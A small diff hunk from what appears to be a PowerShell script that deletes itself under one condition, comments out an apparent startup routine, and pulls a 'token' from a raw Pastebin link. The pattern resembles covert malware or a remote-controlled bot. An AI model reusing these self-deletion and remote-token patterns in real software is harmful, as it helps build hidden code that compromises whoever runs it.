@@ -112,7 +112,7 @@ If ($args[0] -ne $true){
 	rm $me;
 	exit;
 }
-StartOn(2);
+#StartOn(2);
 $pastebin = "https://pastebin.com/raw/nx353a7L";
 $string = Request($pastebin);
 $token = $string.split(" ")[0];
